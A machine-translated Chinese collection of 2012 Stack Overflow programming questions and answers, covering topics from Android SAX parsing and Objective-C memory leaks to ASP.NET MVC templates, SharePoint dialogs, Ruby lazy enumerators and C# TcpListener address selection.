
* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-04-09T05:32:08.843

使用核心服务创建 Schema 所需的最少代码如下：

```
using (var client = new SessionAwareCoreServiceClient(netTcpBinding, remoteAddress))
{
    SchemaData schemaData = client.GetDefaultData(ItemType.Schema, folderId) as SchemaData;
    schemaData.Description = "description";
    schemaData = client.Save(schemaData, readOptions) as SchemaData;
    schemaData = client.CheckIn(schemaData.Id, readOptions) as SchemaData;

    Console.WriteLine("Schema: " + schemaData.LocationInfo.WebDavUrl);
} 
```

Schema 将使用默认命名空间创建。在此示例中，它也不包含任何字段，但这不是您所要求的。

# java - SAXParser 对最小化的 XML 文档一无所获

> ID：10069088
> 
> 赞同：1
> 
> 时间：2012-04-09T05:02:02.227
> 
> 标签：java, android, rss, sax

我正在运行一个小型 Android 项目，它可以使用 SAX 库读取 RSS/Atom Feed 文档。一切都适用于默认的 RSS 源，但是对于最小化的源（没有空格或换行符），它只会产生一个空白项目列表。我在 Log cat 中的日志也没有显示任何内容。我仔细检查了变体 RSS 站点的这个问题，但问题仍然存在。下面是我`DefaultHandler`用来处理 Rss 源的继承类

```
public class RssContentHandler extends DefaultHandler {
    private static final int UNKNOWN_STATE = -1;
    private static final int ELEMENT_START = 0;
    private static final int TITLE_END = 1;
    private static final int DESCRIPTION_END = 2;
    private static final int LINK_END = 3;
    private static final int PUBDATE_END = 4;
    private static final int CHANNEL_END = 5;

    private int iState = UNKNOWN_STATE;
    private String fullCharacters;
    private boolean itemFound = false;
    private RssItem rssItem;
    private RssFeed rssFeed;

    public RssContentHandler() {
    }

    public RssFeed getFeed() {
        return this.rssFeed;
    }

    @Override
    public void startDocument() {
        rssItem = new RssItem();
        rssFeed = new RssFeed();
        Log.i("startDocument", "startDocument");
    }

    @Override
    public void endDocument() {
    }

    @Override
    public void startElement(String _uri, String _localName, String _qName, Attributes _attributes) {
        if (_localName.equalsIgnoreCase("item")) {
            itemFound = true;
            rssItem = new RssItem();
            this.iState = UNKNOWN_STATE;
        } else
            this.iState = ELEMENT_START;
        fullCharacters = "";
    }

    @Override
    public void endElement(String _uri, String _localName, String _qName) {
        if (_localName.equalsIgnoreCase("item"))
            this.rssFeed.addItem(this.rssItem);
        else if (_localName.equalsIgnoreCase("title"))
            this.iState = TITLE_END;
        else if (_localName.equalsIgnoreCase("description"))
            this.iState = DESCRIPTION_END;
        else if (_localName.equalsIgnoreCase("link"))
            this.iState = LINK_END;
        else if (_localName.equalsIgnoreCase("pubDate"))
            this.iState = PUBDATE_END;
        else if (_localName.equalsIgnoreCase("channel"))
            this.iState = CHANNEL_END;
        else
            this.iState = UNKNOWN_STATE;
    }

    @Override
    public void characters(char[] _ch, int _start, int _length) {
        String strCharacters = new String(_ch, _start, _length);
        if (this.iState == ELEMENT_START)
            fullCharacters += strCharacters;
        else {
            if (!itemFound) {
                switch (this.iState) {
                case TITLE_END:
                    this.rssFeed.setTitle(fullCharacters);
                    break;
                case DESCRIPTION_END:
                    this.rssFeed.setDescription(fullCharacters);
                    break;
                case LINK_END:
                    this.rssFeed.setLink(fullCharacters);
                    break;
                case PUBDATE_END:
                    this.rssFeed.setPubDate(fullCharacters);
                    break;
                }
            } else {
                switch (this.iState) {
                case TITLE_END:
                    this.rssItem.setTitle(fullCharacters);
                    Log.i("characters", fullCharacters);
                    break;
                case DESCRIPTION_END:
                    this.rssItem.setDescription(fullCharacters);
                    break;
                case LINK_END:
                    this.rssItem.setLink(fullCharacters);
                    break;
                case PUBDATE_END:
                    this.rssItem.setPubDate(fullCharacters);
                    break;
                }
            }
            this.iState = UNKNOWN_STATE;            
        }
    }
} 
```

和片段来设置解析器：

```
HttpClient client = new DefaultHttpClient();
    HttpGet request = new HttpGet();
    try {
        request.setURI(new URI(_strUrl));
    } catch (URISyntaxException e) {
        e.printStackTrace();
    }
    HttpResponse response = client.execute(request);
    Reader inputStream = new InputStreamReader(response.getEntity().getContent());
    RssContentHandler rssContentHandler = new RssContentHandler();
    InputSource inputSource = new InputSource();
    inputSource.setCharacterStream(inputStream);

    SAXParserFactory saxParserFactory = SAXParserFactory.newInstance();
    SAXParser saxParser = saxParserFactory.newSAXParser();
    saxParser.parse(inputSource, rssContentHandler);

    this.rssFeed = rssContentHandler.getFeed(); 
```

P/s：我正在使用安装在 VirtualBox 上的 Android 2.3 x86 进行调试，这些源代码可以与 x86 版本附带的内置 RSS 阅读器应用程序一起正常工作。那么这里有什么问题呢？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-09T06:27:56.383

尝试使用 _qName 而不是 _localName。

您的 xml 包含 CDATA，因此您无法使用当前解析器解析 XML 响应。您必须使用 LexicalHandler 来解析原始 HTML。

```
public class MyHandler implements LexicalHandler {

  public void startDTD(String name, String publicId, String systemId)
   throws SAXException {}
  public void endDTD() throws SAXException {}
  public void startEntity(String name) throws SAXException {}
  public void endEntity(String name) throws SAXException {}
  public void startCDATA() throws SAXException {}
  public void endCDATA() throws SAXException {}

  public void comment (char[] text, int start, int length)
   throws SAXException {

    String comment = new String(text, start, length);
    System.out.println(comment);

  } 
```

如果内存不是问题，您还可以使用 DOM 解析 XML。如需更多帮助，请访问[处理词汇事件](http://docs.oracle.com/javaee/1.4/tutorial/doc/JAXPSAX11.html)

# iphone - Objective C - 在 MAC LION 中找不到 iPhone 模拟器路径

> ID：10069092
> 
> 赞同：2
> 
> 时间：2012-04-09T05:02:24.797
> 
> 标签：iphone, objective-c, xcode, osx-lion

我正在使用 Mac lion 开发 iPhone 应用程序，在那里我创建了数据库并复制到应用程序的文档目录中，但是在我的 lion 中找不到应用程序文档目录的路径，即使是 Lion 的用户名下的“Library”文件夹也不可用。

我在我的狮子上完全搜索了具有“应用程序支持”和“iPhone 模拟器”的文件夹库，但没有找到。我检查了文件夹删除的移动，但它没有发生。

任何人都知道我找不到文件夹。

请给我建议，我无法解决这个问题。>

提前致谢！！！

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-04-09T06:15:31.963

默认情况下，您的库文件夹是隐藏的，因此您必须取消隐藏它。[您可以在此处](http://www.mactricksandtips.com/2008/04/show-hidden-files.html)获取有关显示隐藏文件的信息

**Edit1**：您也可以通过以下方式去图书馆

*   右键单击 Dock 的 Finder 图标

*   单击“转到文件夹”。

*   键入`/用户/您的用户名/库。

*   点击前往。

**Edit2：** 您可以使用以下命令永久取消隐藏文件夹

```
chflags nohidden /Users/yourusername/Library 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-04-09T05:16:37.873

从顶部的 Xcode 菜单中，单击首选项，选择位置选项卡，查看构建位置选项。

您有 2 个选项：

```
Place build products in derived data location 
Place build products in locations specified by targets 
```

默认情况下，您的派生数据目录将位于 ~/Library/Developer/Xcode/DerivedData/AppName/Build/Documents 下。

请确认是否收到？

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-09T09:41:23.937

你也可以看看我的回答。请参阅我在这篇文章中的回答。您应该清除垃圾文件夹并重置它。有关详细信息，请单击下面的链接。 [应用程序支持中没有 iphone 模拟器文件夹](https://stackoverflow.com/questions/7731518/no-iphone-simulator-folder-in-application-support/8784630#8784630)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-05-13T17:30:23.777

请查看以下解决方案： http: [//helpx.adobe.com/x-productkb/global/access-hidden-user-library-files.html](http://helpx.adobe.com/x-productkb/global/access-hidden-user-library-files.html)

Apple 在 10.7 版本中默认隐藏了用户库文件夹。如果需要访问这些文件以进行与 Adob​​e 相关的故障排除，请使用以下方法之一使用户库内容可见。

**方法一**

在 Finder 中，选择前往 > 前往文件夹。在“转到文件夹”对话框中，键入 ~/Library 单击“转到”。

**方法二**

使用 Go 菜单时按住 Alt (Option) 键。用户库文件夹列在当前用户的主目录下方。

注意：打开 Library 文件夹后，您可以将 Library 图标从该窗口的顶部拖到 Dock、侧边栏或工具栏。这样，它很容易访问。

**方法三**

以下方法使用户库文件夹永久可见。

注意：Adobe 建议仅高级用户使用此方法。

从 Mac HD > 应用程序 > 实用程序启动终端。在终端中键入以下命令并按回车键：

chflags nohidden ~/Library 如果出现提示，请输入系统管理员密码，然后按 Return。

注意：系统管理员密码在您键入时不可见。

关闭终端以使此更改生效。

# iphone - iphone中分配的对象的潜在泄漏

> ID：10069094
> 
> 赞同：1
> 
> 时间：2012-04-09T05:02:30.833
> 
> 标签：iphone, objective-c, ios, memory-management, memory-leaks

当我分析我的项目时，下面的代码给了我泄漏警告。有什么办法可以解决我的内存泄漏问题吗？

警告 ：

```
Potential leak of an object allocated on line 38 and stored into 'addressBook' 
```

贝娄是我的代码。

```
- (void)viewWillAppear:(BOOL)animated
{
    [super viewWillAppear:animated];
    m_tableDataArray = [[[NSMutableArray alloc] init]autorelease];
    NSMutableArray *listDate = [[[NSMutableArray alloc] init]autorelease];
    ABAddressBookRef addressBook = ABAddressBookCreate();
    NSArray *addresses = (NSArray *) ABAddressBookCopyArrayOfAllPeople(addressBook);
    NSInteger addressesCount = [addresses count];
    for (int i = 0; i < addressesCount; i++) {
        ABRecordRef record = [addresses objectAtIndex:i];
        NSString *firstName = (NSString *)ABRecordCopyValue(record, kABPersonFirstNameProperty);
        NSString *lastName = (NSString *)ABRecordCopyValue(record, kABPersonLastNameProperty);
        if(firstName != nil && lastName != nil){
            NSString *contactFirstLast = [NSString stringWithFormat: @"%@ %@", firstName, lastName];
            [listDate addObject:contactFirstLast];
        }
        [firstName release];
        [lastName release];
    }
    m_tableDataArray = [[NSArray arrayWithArray:listDate] retain];
    [addresses release];
    addresses = nil;
    [m_mainTable reloadData];
} 
```

感谢您的建议...

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-04-09T05:10:35.017

完成使用后，`addressBook`您需要使用以下命令释放它：

```
CFRelease(addressBook); 
```

这可能应该放在`viewWillAppear:`方法的末尾。

**更新：**您的`viewWillAppear:`. 我已经对其进行了一些清理并修复了潜在的内存泄漏。

注意：我实际上并没有运行它，所以请仔细检查它是否正常工作。

```
- (void)viewWillAppear:(BOOL)animated
{
    [super viewWillAppear:animated];

    // I assume m_tableDataArray is an instance variable.  If so, if the 
    // view appears multiple times it will result in a leak unless we 
    // release pre-existing instances first.

    [m_tableDataArray release], m_tableDataArray = nil;
    m_tableDataArray = [[NSMutableArray alloc] init];

    ABAddressBookRef addressBook = ABAddressBookCreate();

    NSArray *addresses = (NSArray *)ABAddressBookCopyArrayOfAllPeople(addressBook);

    for (ABRecordRef record in addresses) {
        NSString *firstName = (NSString *)ABRecordCopyValue(record, kABPersonFirstNameProperty);
        NSString *lastName = (NSString *)ABRecordCopyValue(record, kABPersonLastNameProperty);

        if(firstName != nil && lastName != nil){
            NSString *contactFirstLast = [NSString stringWithFormat: @"%@ %@", firstName, lastName];
            [m_tableDataArray addObject:contactFirstLast];
        }

        [firstName release];
        [lastName release];
    }

    [addresses release], addresses = nil;
    CFRelease(addressBook);

    [m_mainTable reloadData];
} 
```

# asp.net - 用于防止 ASP.NET MVC 中出现重复演示代码的中央 HTML 模板

> ID：10069096
> 
> 赞同：2
> 
> 时间：2012-04-09T05:02:49.480
> 
> 标签：asp.net, html, asp.net-mvc, asp.net-mvc-3, templates

在我的应用程序中，我有很多 UI 元素（特别是按钮），我在其中一遍又一遍地重复相同的代码。

例如，在多个视图中，我可能有一个使用以下代码创建的编辑按钮：

```
@Html.ActionLink("Edit", "Edit", "SomeController", null, new { @class="button large blue" }); 
```

这里的问题是我对标签和样式进行了硬编码，所以如果我想更改按钮样式或标签，我必须在多个视图中进行。这样做会很乏味，因为我必须追踪每个按钮。

所以现在我正在考虑创建一个模板机制，我可以在中心区域定义一个按钮模板，并将它带到我想要使用它的任何视图中。

我已经考虑了两个选项，我试图在下面的半现实世界代码中勾勒出来。

我的问题是，我在正确的轨道上吗？哪个选项会更好，出于什么原因？是否已经有一些我可以考虑使用的东西，或者还有其他我没有想到的方法？

谢谢你的帮助。

* * *

## **Web.Config 模板**

创建一个可以从 web.config 文件引入模板配置的自定义类。例如：

```
 <ui.HtmlTemplates>
      <add templateKey="FormCancel" tag="a" class="form-button large black" />
      <add templateKey="FormSave" tag="input" type="submit" class="form-button large green" />
 </ui.HtmlTemplates> 
```

然后可以用这样的语法调用它们（方法签名是人为的）

```
@HtmlTemplates.Build("FormCancel", Url.Action("Index", "Home")) 
```

* * *

## **局部视图模板**

使用我想要的模板创建强类型的局部视图。

**视图模型**

```
public class UiButtonModel
{
    public string Url{ get; set; }
} 
```

**局部视图**

```
// Assume the file is called "_Button_FormCancel"
@Model path.to.model.directoy.UiButtonModel

<a href="@Model.Url" class="form-button large black">Cancel</a> 
```

**利用**

```
@Html.Partial("_Button_FormCancel", new UiButtonModel(){Url = Url.Action("Index", "Home")); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-09T05:08:27.213

我创建了这些类型的模板并将它们放在我的`Views/Shared`文件夹中。

我有这样的模板：

```
AddButton.cshtml
DeleteButton.cshtml
SaveButton.cshtml

... 
```

然后，当我需要调用其中之一时`View`，我只需调用它，例如：

```
@Html.Partial("SaveButton"); 
```

使用[T4MVC](http://mvccontrib.codeplex.com/wikipage?title=T4MVC)，编译时检查会变得更好（不再有文字字符串）：

```
@Html.Partial(MVC.Shared.Views.SaveButton) 
```

这样做我有一个公共/中心位置来更改特定的按钮配置。无需逐个查看即可更改某些内容。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-09T05:34:27.847

另一种选择是创建扩展方法，`HtmlHelper`以使用代码创建预打包的 HTML 输出：

```
using System.Web.Mvc;
using System.Web.Routing;

public static class MyHtmlExtensions
{
    public static string SaveButton(this HtmlHelper helper, string title = "Save", IDictionary<string, object> htmlAttributes = null)
    {           
        var builder = new TagBuilder("button");

            builder.Attributes.Add("type", "button");

        builder.AddCssClass("form-button");
        builder.AddCssClass("large");
        builder.AddCssClass("green");

        if (htmlAttributes != null) builder.MergeAttributes(htmlAttributes);

        builder.SetInnerText(helper.Encode(title));

        return builder.ToString();
    }

    public static string CancelButton(this HtmlHelper helper, string title = "Cancel", string actionName, string controllerName, RouteValueDictionary routeValues = null, IDictionary<string, object> htmlAttributes = null)
    {
            var urlHelper = new UrlHelper(helper.ViewContext.RequestContext, helper.RouteCollection);

            var builder = new TagBuilder("a");

            builder.Attributes.Add("href", urlHelper.Action(actionName, controllerName, routeValues));

        builder.AddCssClass("form-button");
        builder.AddCssClass("large");
        builder.AddCssClass("green");

        if (htmlAttributes != null) builder.MergeAttributes(htmlAttributes);

        builder.SetInnerText(helper.Encode(title));

        return builder.ToString();

    }
} 
```

然后只需确保命名空间`MyHtmlExtensions`是直接添加到您的页面，或者通过 web.config 包含在所有页面中，并在您的视图中像这样使用它（剃刀语法）：

```
<div class="form-buttons">
@Html.CancelButton("Index", "Home")
@Html.SaveButton()
</div> 
```

此方法特别适合在多个解决方案中一致地创建输出，因为您需要做的就是引用包含程序集并导入命名空间。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-09T05:15:08.247

这是 css 旨在处理的问题。我无法理解这个问题。如果要进行更改，请更改 CSS，它会影响具有该样式的所有按钮。

你的部分问题是你使用像“蓝色”这样的风格。如果你想把它改成红色，你就得到处改。

相反，您应该有一个按钮类，然后您可以简单地更改按钮样式，而不必担心将蓝色重新定义为红色。

# javascript - 如何在另一个页面上编辑列表项

> ID：10069102
> 
> 赞同：2
> 
> 时间：2012-04-09T05:03:34.360
> 
> 标签：javascript, sharepoint-2010

**情况**

在 Sharepoint 2010 中，我可以单击列表中的项目：

![在此处输入图像描述](../Images/a830cb1c864600bdd0a2840726c07264.png)

然后读取/编辑视图在该页面中变得可见：

![在此处输入图像描述](../Images/25ced72f9713f4475ad4ca6a51b68ff3.png)

**我的目标**

*我在另一个页面上*有一个 WebPart ，我在其中显示了来自此列表和其他几个列表的一些项目，我想为每个列表添加一个读取或编辑链接。

我怎样才能做到这一点？

我正在寻找一个`EditListItem('ItemId', 'ListId', ...)`可以打开编辑 div 窗口的函数。

**我试过什么**

Sharepoint在上面的“Test Item”上生成的a标签是这样的：

```
<a onfocus="OnLink(this)" 
   href="http://{mysharepointsite}/_layouts/listform.aspx
         ?PageType=4
         &amp;ListId={D0FDB54F-1DDF-4C5E-865B-ABDE55C1125}
         &amp;ID=1
         &amp;ContentTypeID=0x010800ED5176D13CCEFC4AA8D62A79985DE892"
   onclick="EditLink2(this,49);return false;" target="_self">Test Item</a> 
```

因此，我深入研究了 Sharepoint JS 文件，发现从上下文 ( )`EditLink2`调用`_EditLink2`哪些调用是上下文 no 并且似乎是动态的。`ShowPopup``49`

我试图伪造上下文，但有数十亿个变量，我认为我无法让它稳定工作。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-11T10:52:26.177

在需要打开对话框的页面上，只需编写简单的 JS 函数来显示[模态对话框](http://msdn.microsoft.com/en-us/library/ff410058.aspx)，例如：

```
function openMyItemDialog( itemId ) {
    var options = {
        url: "http://{mysharepointsite}/_layouts/listform.aspx?PageType=4&ListId={D0FDB54F-1DDF-4C5E-865B-ABDE55C1125}&ID=" + itemId + "&ContentTypeID=0x010800ED5176D13CCEFC4AA8D62A79985DE892&IsDlg=1",
        width: 500,
        height: 500,
        title: "Item view/edit"
    };
    SP.UI.ModalDialog.showModalDialog( options );
} 
```

注意`&IsDlg=1`url 处的参数

然后修改显示项目的 href 链接。

例如：

```
<a href="#" onclick="openMyItemDialog(35)">Test item</a> 
```

替换`35`到`ID`您的项目

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-02-17T17:37:30.873

我知道这是一个老问题，但是还有另一种方法可以实现 OP 试图做的事情。

在 XSLT ViewWebPart 中，有一个名为 $ViewCounter 的全局参数。这是 _EditLink2 函数所需的上下文编号。

因此，为了向显示表单添加链接并在对话框中打开它，请将项目包装在`<a>`这样的标签中：

```
<a href="{$HttpVDir}/_layouts/listform.aspx?PageType=4&amp;ListId={$List}&amp;ID={$thisNode/@ID}" onclick="EditLink2(this,{$ViewCounter});return false;">your item</a> 
```

注意变量 $HttpVDir、$List、$thisNode/@ID 和 $ViewCounter（无需硬编码任何值）。

# ruby-on-rails - RAILS 3.2 - 嵌套资源有很多：通过关系

> ID：10069103
> 
> 赞同：0
> 
> 时间：2012-04-09T05:03:36.390
> 
> 标签：ruby-on-rails, ruby-on-rails-3, nested-forms, has-many, has-many-through

伙计们，我对此变得完全疯狂......并且根本无法弄清楚如何摆脱所有这些麻烦。我真的需要一个神圣的帮助，或者至少一些关于这个问题的教程和指南的建议。

我相信这在许多应用程序中是一项非常常见的任务，但我在这个意义上找不到任何帮助，不是在 stackoverflow 上，不是在谷歌上，不是在我知道的其他 Rails 论坛上......我开始觉得一个笨蛋！！！

**问题**

(1) 模型（涉及的模型）

User.rb Item.rb（嵌套在用户中：例如user/3/item/5）

(2) 我想做的事

current_user（登录的用户）可以创建一个项目，并以相同的形式决定与许多其他用户共享或不共享它。

通过这种方式，我们与之共享的用户也可以看到和访问该项目。

我知道这里将涉及的是：

（a）has_many：通过item和user之间的关系（b）我们可以称之为共享的联合表（带有item_id和user_id）（c）最终为用户使用不同的名称并使用：class_name指向用户

这并不难实现（周围有很多例子）。

真正乱七八糟的是如何构建控制器（item controller），以便一次性执行，创建新项目，以及共享操作（这意味着在关节表中设置参数，以及最终创建与我们共享的用户一样多的记录 - 数组？）

另一个问题，显然与控制器有关，将是视图......如何将所有这些放在一个表单中，并允许 current_user 只需单击按钮，然后执行项目创建 + 共享操作？

最后但并非最不重要的一点是，我需要如何处理 User 与 current_user 的模型相同的事实？

我真的不知道我需要阅读或查找什么才能让这个工作，我很想看到一些示例代码，但同时我很想真正理解这一切的逻辑，为了能够在其他场景中复制它。

请有人帮助我...如果不这样做，我就无法真正继续我的应用程序开发，这也是所有项目的关键部分。

非常感谢我收到的每一点帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-14T22:06:06.823

好的，我已经解决了我所有的问题......最后这并不是一项艰巨的任务（当你解决问题时说起来总是很容易:)）

我仍然存在的唯一疑问是 Rails 名称约定：

对于联合模型，使用共享之类的名称是否有可能导致rails不能很好地处理最终的-ing？

经过多次尝试尝试解决我的问题，我发现一切都设置正确，只需将联表名称从共享更改为共享，让魔术起作用！

# android - Android 开发者控制台中的公钥有什么用？

> ID：10069105
> 
> 赞同：0
> 
> 时间：2012-04-09T05:03:40.493
> 
> 标签：android

我已经用 keytool 签署了我的 android 应用程序，但不知道如何在我的 android 开发者控制台中处理公钥。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-09T05:22:43.260

你可以在[这里](http://developer.android.com/guide/market/licensing/setting-up.html)阅读。它是 Google 的 Android 应用程序许可的一部分

# java - Android SeekBar - 独立于进度条更改滚动条值

> ID：10069106
> 
> 赞同：1
> 
> 时间：2012-04-09T05:03:42.237
> 
> 标签：java, android, user-interface, seekbar

我正在尝试使用 a`SeekBar`来表示两条信息：

1.  录音的阈值，用户可以设置。
2.  用户无法设置的传入音频电平。

我想使用用户触摸输入来更改 的`ScrollBar`，`SeekBar`表示所需的阈值。进度颜色条将由我以编程方式设置以显示音频级别，与`ScrollBar`位置无关，并且不受用户输入的影响。

我试过使用`SeekBar.setScrollX(int)`and `SeekBar.setScrollY(int)`，但是文档说这些调用会使视图无效，并且当调用这些函数之一时程序确实会崩溃。

这是触摸事件代码：

```
@Override
public boolean onTouchEvent(MotionEvent event) {
    if (!isEnabled()) {
        return false;
    }

    switch (event.getAction()) {
        case MotionEvent.ACTION_DOWN:
        case MotionEvent.ACTION_MOVE:
        case MotionEvent.ACTION_UP:
            setProgress(getMax() - (int) (getMax() * event.getY() / getHeight()));
            setScrollX(50); // this causes a MethodNotFoundError
            onSizeChanged(getWidth(), getHeight(), 0, 0);                
            break;

        case MotionEvent.ACTION_CANCEL:
            break;
    }
    return true;
} 
```

这是我正在使用的简单测试 onScrollChanged 函数。请注意，如果没有被覆盖，NoSuchMethodFoundError 仍然会发生。

```
@Override
public void onScrollChanged(int x, int y, int x1, int y1) {
    super.onScrollChanged(0, 0, 0, 0);
} 
```

# ruby-on-rails - 基于 Ruby Enumerator 的惰性扁平化方法

> ID：10069110
> 
> 赞同：2
> 
> 时间：2012-04-09T05:04:47.467
> 
> 标签：ruby-on-rails, ruby, functional-programming, lazy-evaluation, enumerator

Michael Harrison 有一篇关于[Ruby 中惰性枚举](http://www.michaelharrison.ws/weblog/?p=163)器的精彩文章，提供了`lazy_select`和的实现`lazy_map`。我想知道以下实现是否应该对和类型`lazy_flatten`以外的任何东西进行特殊处理。`Enumerator``Enumerable`

```
class Enumerator

  def lazy_flatten
    Enumerator.new do |yielder|
      self.each do |value|
        if value.kind_of? Enumerator
          value.lazy_flatten.each do |v|
            yielder.yield v
          end
        elsif value.kind_of? Enumerable
          value.flatten.each do |v|
            yielder.yield v
          end
        else
          yielder.yield value
        end
      end
    end
  end

end 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-09T12:14:18.267

1.  这对我来说似乎并不懒惰，因为您仍然在下面执行旧（非懒惰）`flatten`。
2.  `Enumerator`是`Enumerable`，所以我认为你不需要单独处理它。
3.  我希望`lazy_flatten`成为方法`Enumerable`。

以下是我将如何实现它：

```
module Enumerable
  def lazy_flatten
    Enumerator.new do |yielder|
      each do |element|
        if element.is_a? Enumerable
          element.lazy_flatten.each do |e|
            yielder.yield(e)
          end
        else
          yielder.yield(element)
        end
      end
    end
  end
end 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2021-01-25T21:32:17.583

请注意，在 Ruby 2.0+ 中，您不需要这样做，您只需使用[`Enumerable#lazy`](https://ruby-doc.org/core-2.0.0/Enumerable.html#method-i-lazy)，它会返回一个[`Enumerator::Lazy`](https://ruby-doc.org/core-2.0.0/Enumerator/Lazy.html).

由于我不清楚的原因，`Lazy`没有`flatten`，但它有[`flat_map`](https://ruby-doc.org/core-2.0.0/Enumerator/Lazy.html#method-i-flat_map)，所以原则上你可以使用`flat_map`身份[功能](https://en.wikipedia.org/wiki/Identity_function)。

```
module Enumerable
  def lazy_flatten
    self.lazy.flat_map { |x| x }
  end
end 
```

`Lazy#flat_map` **主要**负责分解任何可分解的元素，但不完全——来自[文档](https://ruby-doc.org/core-2.0.0/Enumerator/Lazy.html#method-i-flat_map)：

> 如果以下任一条件为真，则 block 返回的值*x*被分解：
> 
> 1.  *x*对`each`and都有响应`force`，这意味着它`x`是一个惰性枚举器。
> 2.  *x*是一个数组或响应`to_ary`。

请注意，这`to_ary`不是 上的方法`Enumerable`，大概是为了阻止从无限序列到数组的[隐式转换。](https://ruby-doc.org/core-2.7.2/doc/implicit_conversion_rdoc.html)这意味着，例如，如果您尝试使用上述代码`lazy_flatten`包含 a`Set`或 a`Range`的内容，它（arguaby，见下文）将不起作用：

```
a = [[1, 2, 3], Set[4, 5], 6, 7..8]
# => [[1, 2, 3], #<Set: {4, 5}>, 6, 7..8] 
f = a.lazy_flatten
# => #<Enumerator::Lazy: #<Enumerator::Lazy: [[1, 2, 3], #<Set: {4, 5}>, 6, 7..8]>:flat_map>  
f.to_a
# => [1, 2, 3, #<Set: {4, 5}>, 6, 7..8] 
```

但是，这与 的行为相同`Array#flatten`：

```
a.flatten
# => [1, 2, 3, #<Set: {4, 5}>, 6, 7..8] 
```

（虽然`Array#flatten`不会检测和分解惰性枚举器，但`Lazy#flat_map`会。）

而 OP 的代码或[Mladen Jabnović 的答案](https://stackoverflow.com/a/10073012/27358)中的代码将分解`Set`和`Range`：

```
f = a.lazy_flatten # (M.J.'s code)
# => #<Enumerator: #<Enumerator::Generator:0x00007fd819c166c0>:each>
f.to_a
# => [1, 2, 3, 4, 5, 6, 7, 8] 
```

但是，如果传递包含无限序列的内容，该代码也将无限迭代：

```
a = [[1, 2, 3], Set[4, 5], 6, 7..8, 9..Float::INFINITY]
# => [[1, 2, 3], #<Set: {4, 5}>, 6, 7..8, 9..Infinity]
f = a.lazy_flatten # (M.J.'s code)
# => #<Enumerator: #<Enumerator::Generator:0x00007fd819a73d18>:each>
f.to_a
# => spins at 100% CPU for a while and eventually runs out of memory 
```

如果您认为这是一个特性，而不是一个错误，那么一种方法是修改`flat_map`基于 - 的实现，以将它找到的任何可枚举转换为惰性枚举：

```
module Enumerable
  def lazy_flatten
    self.lazy.flat_map do |x|
      x.respond_to?(:lazy) ? x.lazy : x
    end
  end
end 
```

这甚至适用于嵌套的惰性枚举，因为`Lazy#lazy`它足够聪明以返回自身。

# c# - 网络选择

> ID：10069112
> 
> 赞同：0
> 
> 时间：2012-04-09T05:05:00.537
> 
> 标签：c#, networking

我正在使用 TcpClient 和套接字开发 P2P 聊天应用程序。

我编写了以下代码来接受 tcpclient：

```
IPAddress[] ip = Dns.GetHostAddresses(Dns.GetHostName());
IPAddress ip_local = Dns.GetHostAddresses(Dns.GetHostName())[0];
// IPAddress ip_local = IPAddress.Parse(ip_local);
TcpListener tcpl = new TcpListener(new IPEndPoint(ip_local, 9277));
while (true)
{
    try
    {
        tcpl.Start();
        TcpClient tcpClient = tcpl.AcceptTcpClient();
        StateObject state = new StateObject();
        state.workSocket = tcpClient.Client;
        tcpClient.Client.BeginReceive(state.buffer, 0, StateObject.BufferSize, 0,
            new AsyncCallback(OnReceive), state);
    }
    catch (Exception ex)
    {

    }
} 
```

问题是它每次都选择不同的网络[因为我有 1 个 LAN 和 2 个 VMWARE 网络]。那么问题是如何强制它获取局域网的网络地址，即特定的网络？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-09T05:43:37.687

您正在从 DNS 主机名中获取本地 IP 地址。问题可能是其中一个或两个（但按顺序）自动将其地址注册为您的主机名。您有几个选择：1）更改 DNS 主机名以指向正确的地址；2）具体获取地址，[GetHostAddresses](http://msdn.microsoft.com/en-us/library/system.net.dns.gethostaddresses.aspx)函数将IP地址作为参数或主机名。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-09T05:44:15.840

看看这个建议不要使用并提供更彻底的方法的[答案。](https://stackoverflow.com/a/6668909/733805)`Dns.GetHostAddresses`

不确定，但我认为[System.Net.NetworkInformation.IPInterfaceProperties](http://msdn.microsoft.com/en-us/library/system.net.networkinformation.ipinterfaceproperties.aspx)可能在这里感兴趣。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-09T13:24:05.717

因此，这就是如何检测正确的 localIP 以传递 TcpListener 构造函数，就像您似乎已经在做的那样：

```
TcpListener tcpl = new TcpListener(new IPEndPoint(ip_local, 9277)); 
```

这是我们在开源网络框架[networkComms.net](https://bitbucket.org/MarcF/networkcomms.net)中解决的一个特别重要的问题。[如果您在此处](https://bitbucket.org/MarcF/networkcomms.net/src/5f0c7fb0e93a/NetworkCommsDotNet/NetworkComms.cs#cl-80)查看第 80 行的 Getter for LocalIP ，有几种方法：

1.  ping 一个已知的外部 IP，然后使用操作系统选择的网络适配器（使用 iphlpapi.dll，因此仅支持 windows）。
2.  使用 NetworkInterface.GetAllNetworkInterfaces() 搜索所有已知的 IP 适配器，并选择 IP 与提供的前缀匹配的一个，例如 192.* 等。

关于如何使用 networkComms.net 的 11 个基本示例也可能很有趣，请[点击此处](https://bitbucket.org/MarcF/networkcomms.net/src/5f0c7fb0e93a/ExamplesConsole/BasicSend.cs)。

# java - 如何将应用程序（.exe 等）嵌入到 jsp 页面中

> ID：10069117
> 
> 赞同：0
> 
> 时间：2012-04-09T05:06:18.433
> 
> 标签：java, jsp

如果用户在 jsp 上单击应用程序的图标，如何将应用程序（.exe 等）嵌入到 jsp 页面中。它会自动打开应用程序的界面。看起来好像应用程序正在浏览器上运行。我们如何做到这一点？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-09T05:48:41.813

